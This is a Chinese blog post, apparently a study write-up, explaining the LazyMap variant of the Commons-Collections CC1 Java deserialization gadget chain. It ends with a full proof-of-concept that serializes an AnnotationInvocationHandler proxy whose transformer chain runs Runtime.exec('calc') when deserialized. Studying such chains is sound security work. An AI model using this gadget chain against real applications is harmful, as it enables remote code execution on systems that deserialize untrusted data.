# CC1补充-LazyMap利用

<!--more-->

分析了上一条链子，其实在TransformMap类那里有个分叉点，就是还可以利用另一个类LazyMap进行transform方法的调用。

进入到LazyMap类中，发现get方法也调用了transform方法：

![QQ截图20240620214456](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ截图20240620214456.png)

可以看到在调用方法之前有个if的判断，跟进这个containKey函数：

![QQ截图20240620215313](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240620215313.png)

翻译一手：

![QQ截图20240620215424](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240620215424.png)

也就是传入的key值是map键值对中没有的就会返回false了，这个很容易就能实现。

然后看看怎么控制参数`factory`，发现构造方法可以对factory进行赋值，虽然有两个构造方法但其参数类型不同先不管。

![QQ截图20240620220336](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240620220336.png)

这里又是保护属性，需要找一找看有没有其他地方对其进行了调用。发现和TransformMap一样都有个静态方法decorate能够实现构造方法的调用。

![QQ截图20240620220728](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240620220728.png)

测试一下：

```java
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.Map;

public class CC1test {
    public static void main(String[] args) throws Exception {
        InvokerTransformer t = new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"});
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> Lazy = LazyMap.decorate(map,t);
        Lazy.get(Runtime.getRuntime());
    }
}
```

![QQ截图20240620221701](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240620221701.png)

还是和上一条链子一样，继续向上找看谁调用了get方法，发现有一千多个结果，这怎么找。

反正感觉应该和上一条链子是差不多的，直接从终点类AnnotationInvocationHandle开始找，不过发现`memberValues.get`并不在`readObjetc`中而是在`invoke`方法里。

![QQ截图20240621151605](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240621151605.png)

但这里是Handler中的invoke方法，这不是很熟悉吗。在jdk动态代理是可以通过`Proxy.newProxyInstance`获得对象，然后调用该对象方法来达到Handler.invoke()方法。但是这怎么和readObject相联系呢？

我们在来看看在执行readObject的时候有没有什么我们可以控制的方法调用（因为要通过方法调用来转到Handler.invoke()方法），

![QQ截图20240622214424](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240622214424.png)

这个首当其冲就应该想到memberValues吧，毕竟这个承参数最容易控制。然后看到在for循环的时候调用了其方法entrySet（下面它的其他方法就不用看了，调用到第一个方法的时候就已经转到Handler.invoke()方法了）。所以思路清晰了，就是让memberValues为Proxy.newProxyInstance获得的对象就行了。这样在进行反序列化的到for时就能自动进入invoke方法，在进入invoke方法时，我们在通过构造函数把memberValues设为lazyMap，这样就可以调用到lazyMap的get方法，在由get方法去调用transform方法。

反序列化是这样，所以构造序列化payload就行先把memberValues设为lazyMap，在把memberValues设为Proxy.newProxyInstance获得的对象。

先构造Hanlder对象：

```java
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=c.getDeclaredConstructor(Class.class, Map.class);
        con.setAccessible(true);
        InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); //通过构造函数设memberValues为lazyMap
```

然后利用Proxy.newProxyInstance获得的proxyMap对象并且handler参数为hand（这样就可转到AnnotationInvocationHandler的invoke方法呢）

```java
Map  proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},hand);
```

接下来只需要调用proxyMap的方法了，设memberValues为proxyMap：

```java
 InvocationHandler in =(InvocationHandler) con.newInstance(Repeatable.class,proxyMap);
```

所以最后poc：

```java
package org.example;
import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Repeatable;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.Proxy;

public class CC1test {
    public static void main(String[] args)throws Exception {


                Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };

                ChainedTransformer cha=new ChainedTransformer(transformers);

        InvokerTransformer t = new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"});
        HashMap<Object,Object> map = new HashMap<>();
        map.put("entrySe","entrySet"); //可以不用设，不要把key设为entrySet，不然不满足lazy.get条件
        Map<Object,Object> Lazy = LazyMap.decorate(map,cha);

        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=c.getDeclaredConstructor(Class.class, Map.class);
        con.setAccessible(true);
        InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy);

        Map  proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},hand);
        InvocationHandler in =(InvocationHandler) con.newInstance(Repeatable.class,proxyMap);
        serilize(in);
        deserilize("serr.bin");
            }
    public static void serilize(Object obj)throws IOException{
        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream("serr.bin"));
        out.writeObject(obj);
    }
    public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{
        ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename));
        Object obj=in.readObject();
        return obj;
   }

}
```

运行得到计算机：

![QQ截图20240622225638](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240622225638.png)


